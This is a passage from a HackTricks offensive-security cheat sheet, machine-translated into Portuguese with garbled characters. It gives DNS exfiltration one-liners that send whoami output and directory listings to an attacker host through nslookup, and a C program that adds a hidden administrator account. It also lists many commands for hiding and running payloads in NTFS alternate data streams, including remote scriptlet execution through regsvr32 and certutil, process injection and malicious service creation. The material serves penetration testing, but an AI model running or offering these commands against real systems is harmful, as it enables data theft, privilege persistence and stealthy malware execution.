for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```
Voc√™ tamb√©m pode **redirecionar** a sa√≠da e, em seguida, **ler**.
```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```
## Chamando CMD a partir de c√≥digo C
```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
    int i;
    i=system("net users otherAcc 0TherAcc! /add");
    i=system("net localgroup administrators otherAcc /add");
    return 0;
}
```
## Folha de dicas de fluxos de dados alternativos (ADS/Fluxo de Dados Alternativos)

Retirado de [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
```bash
##Add content to ADS###
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
print /D:c:\ads\file.txt:autoruns.exe c:\ads\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
esentutl.exe /y C:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o
powershell -command " & {(Get-Content C:\ADS\file.exe -Raw | Set-Content C:\ADS\file.txt -Stream file.exe)}"
curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://evilsite.com/RegSvr32.sct   ^scrobj.dll > fakefile.doc:reg32.bat
set-content - path {path to the file} - stream {name of the stream}

## Discover ADS contecnt
dir /R 
streams.exe <c:\path\to\file> #Binary from sysinternals#
Get-Item -Path .\fie.txt -Stream *
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'

##Extract content from ADS###
expand c:\ads\file.txt:test.exe c:\temp\evil.exe
esentutl.exe /Y C:\temp\file.txt:test.exe /d c:\temp\evil.exe /o
more < c:\ads\file.txt:test.exe

##Executing the ADS content###

* WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'

* Rundll32
rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain
rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll
rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll

* Cscript
cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"

* Wscript
wscript c:\ads\file.txt:script.vbs
echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js

* Forfiles
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"

* Mavinject.exe
c:\windows\SysWOW64\notepad.exe
tasklist | findstr notepad
notepad.exe                   4172 31C5CE94259D4006           2     18,476 K
type c:\temp\AtomicTest.dll > "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
c:\windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\mavinject.exe 4172 /INJECTRUNNING "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"

* MSHTA
mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
(Does not work on Windows 10 1903 and newer)

* Control.exe
control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll
https://twitter.com/bohops/status/954466315913310209

* Create service and run
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/

* Powershell.exe
powershell -ep bypass - < c:\temp:ttt

* Powershell.exe
powershell -command " & {(Get-Content C:\ADS\1.txt -Stream file.exe -Raw | Set-Content c:\ADS\file.exe) | start-process c:\ADS\file.exe}"

* Powershell.exe
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = C:\ads\folder:file.exe}

* Regedit.exe
regedit c:\ads\file.txt:regfile.reg

* Bitsadmin.exe
bitsadmin /create myfile
bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe
bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
bitsadmin /RESUME myfile

* AppVLP.exe
AppVLP.exe c:\windows\tracing\test.txt:ha.exe

* Cmd.exe
cmd.exe - < fakefile.doc:reg32.bat
https://twitter.com/yeyint_mth/status/1143824979139579904

* Ftp.exe
ftp -s:fakefile.txt:aaaa.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* ieframe.dll , shdocvw.dll (ads)
echo [internetshortcut] > fake.txt:test.txt && echo url=C:\windows\system32\calc.exe >> fake.txt:test.txt rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt
rundll32.exe shdocvw.dll,OpenURL C:\temp\ads\fake.txt:test.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* bash.exe
echo calc > fakefile.txt:payload.sh && bash < fakefile.txt:payload.sh
bash.exe -c $(fakefile.txt:payload.sh)
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* Regsvr32
type c:\Windows\System32\scrobj.dll > Textfile.txt:LoveADS
regsvr32 /s /u /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Textfile.txt:LoveADS
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
